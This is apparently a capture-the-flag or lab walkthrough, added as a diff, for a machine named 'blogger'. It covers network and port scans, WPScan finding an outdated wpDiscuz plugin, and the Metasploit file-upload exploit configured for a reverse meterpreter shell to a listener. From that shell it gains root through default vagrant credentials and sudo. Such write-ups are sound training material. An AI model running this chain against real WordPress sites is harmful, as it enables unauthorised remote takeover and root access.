@@ -1,0 +1,66 @@
+1. Network scan the subset to find target machine IP address
+
+ - IP FOUND: Nmap scan report for ubuntu-xenial (192.168.1.173)
+
+2. Port Scan target machine to find open services
+
+	PORTS FOUND:
+
+		22 - SSH
+		80 - HTTP Webserver
+
+3. Visit webpage (Added "blogger.thm" to /etc/hosts)
+
+4. Started gobuster on endpoint. Resulting endpoints saved in gobuster.txt
+
+5. Wordpress instance found on /assets/fonts/blog
+
+6. Wappalyzer shows that this application is running wordpress
+
+7. Running WPScan against the endpoint. Resuls saved into wpscan.txt
+
+8. From this, we found two out of date plugins
+	- akismet 4.0.8
+	- wpdiscuz 7.0.4 (This is vulnerable to abitrary file upload)
+
+9. Metasploit has a exploit module for the above vulnerability
+
+	exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload
+
+	RHOST = http://blogger.thm/assets/fonts/blog/
+	BLOGPOST = ?p=29
+	LHOST = 192.168.1.168
+	LPORT = 4444
+
+10. This opens up a meterpreter shell on the remote host. (Unprivledged as www-data with /bin/sh)
+
+11. From here we need to upgrade the shell, we can do this with a python
+
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+12. Next we are going to enumerate the users on the system:
+	
+	james
+	ubuntu
+	vagrant
+
+13. Seeing that we have a vagrant user, we can attempt to find default credentials that come with that service. With a quick google search, we can find that vagrant/vagrant are the default credentials. We are able to switch users sucessfully with
+
+	su vagrant
+	password: vagrant 
+
+14. From there we can view all of the sudo permissions that the vagrant has with
+
+	sudo -l
+
+    and we can see that we have no password accesss to all commands on the system
+
+15. So if we run sudo escalation with
+
+	sudo -i
+
+    we will be elevated to the root user
+
+
+
+	 
